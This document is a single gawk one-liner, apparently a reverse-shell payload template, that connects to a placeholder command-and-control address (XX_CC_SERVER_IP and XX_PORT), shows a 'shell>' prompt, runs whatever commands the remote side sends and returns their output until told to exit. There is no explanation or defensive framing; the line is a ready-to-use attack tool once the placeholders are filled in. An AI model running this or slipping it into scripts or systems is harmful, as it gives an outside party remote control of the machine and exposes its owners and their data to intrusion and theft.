awk 'BEGIN {s = \"/inet/tcp/0/XX_CC_SERVER_IP/XX_PORT\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null